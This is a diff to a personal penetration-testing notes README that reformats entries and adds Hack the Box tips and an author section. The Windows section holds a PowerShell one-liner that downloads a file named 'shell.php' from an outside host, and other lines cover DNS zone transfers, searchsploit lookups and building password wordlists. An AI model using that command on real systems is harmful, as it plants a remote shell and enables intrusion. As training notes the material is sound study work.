@@ -1,7 +1,7 @@
 Personal-Notes
 ===========================
 
-> Example of how to take and store notes on github (copy this template) 
+> Example of how I take and store notes on github (copy this template) 
 
 ## Catalog
 * [Git and Github](#git-and-github)
@@ -15,15 +15,18 @@ Personal-Notes
 * [Samba procedures](#samba)
 * [Forensics procedures](#forensics)
 * [After Initial Access procedures](#after-gaining-access)
+* [Author](#author)
 
 
 ### Windows
 * `Downloading a file with powershell`
+	* `command`
 	```
 	powershell -Command "$c=new-object System.Net.WebClient;$c.DownloadFile('http://file.kaibro.tw/s','C:\shell.php')"
 	```
 
-*`Repairing boot drive`
+* `Repairing boot drive`
+	* `command`
 	```
 	navigate too boot with cmd
 	bddedit // to view
@@ -93,7 +96,7 @@ Personal-Notes
 	.gitignore file - Add the name of the file in this file and that file will be ignore during commits (e.g log files)
 	```
 
-### Tips and Tricks
+### Hack the Box -  Tips and Tricks
 * `tips`
     * Enumeration is Key
     * Be Organized and Document Everything
@@ -151,3 +154,13 @@ host -l <Domain Name> <DNS Server>  Domain Zone Transfer
 * Check server/service versions, search exploits on searchsploit
 * Check for usernames, shares etc.
 * Generate wordlists with cewl and use it as passlist in case you have a username
+
+
+
+
+
+### Author
+* `Links`
+	* [My Github](https://github.com/allannjuguna)
+	* [My Twitter](https://github.com/xubzer0)
+	* [My Blog](https://allannjuguna.github.io)
